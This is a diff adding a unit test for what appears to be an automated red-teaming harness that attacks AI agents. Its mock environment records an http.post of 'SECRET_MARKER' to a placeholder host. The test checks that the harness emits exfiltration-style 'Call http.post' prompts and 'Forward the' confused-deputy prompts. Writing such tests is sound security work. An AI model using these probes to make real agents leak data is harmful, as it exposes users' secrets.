@@ -72,6 +72,43 @@ def test_run_search_disabled_uses_fallback():
     assert result == _static_fallback()
 
 
+def test_run_live_fires_return_posts_then_deputies(monkeypatch):
+    # Hosted main path: probes fire -> validated posts first, deputies after,
+    # no fallback mixed in.
+    import attack as attack_mod
+    import itertools as _it
+
+    class _FiringEnv:
+        def __init__(self):
+            self.n = 0
+        def reset(self, *a, **k):
+            pass
+        def interact(self, msg, max_tool_hops=None):
+            assert max_tool_hops is not None
+        def export_trace_dict(self):
+            self.n += 1
+            return {"tool_events": [
+                        {"name": "http.post", "ok": True,
+                         "side_effect": "SHARE", "source": "tool",
+                         "args": {"url": "https://x.example.org/log",
+                                  "data": "SECRET_MARKER"}}],
+                    "user_messages": [], "egress": [], "seed": 123}
+
+    real_urls = attack_mod._url_stream
+    real_recips = attack_mod._recipient_stream
+    monkeypatch.setattr(attack_mod, "_url_stream",
+                        lambda: iter(_it.islice(real_urls(), 5)))
+    monkeypatch.setattr(attack_mod, "_recipient_stream",
+                        lambda: iter(_it.islice(real_recips(), 3)))
+    result = AttackAlgorithm().run(_FiringEnv(), AttackRunConfig(time_budget_s=8750))
+    msgs = [c.user_messages[0] for c in result]
+    posts = [m for m in msgs if m.startswith("Call http.post")]
+    deps = [m for m in msgs if m.startswith("Forward the")]
+    assert len(posts) == 5 and len(deps) == 3   # all validated, both fills ran
+    assert msgs.index(deps[-1]) > msgs.index(posts[-1])  # posts before deputies
+    assert len(msgs) == 8                        # no fallback mixed in
+
+
 def test_finalize_respects_candidate_cap():
     # run() 的最后防线是 _finalize 的 2000 上限(防御性,正常路径远达不到)
     from attack import _finalize
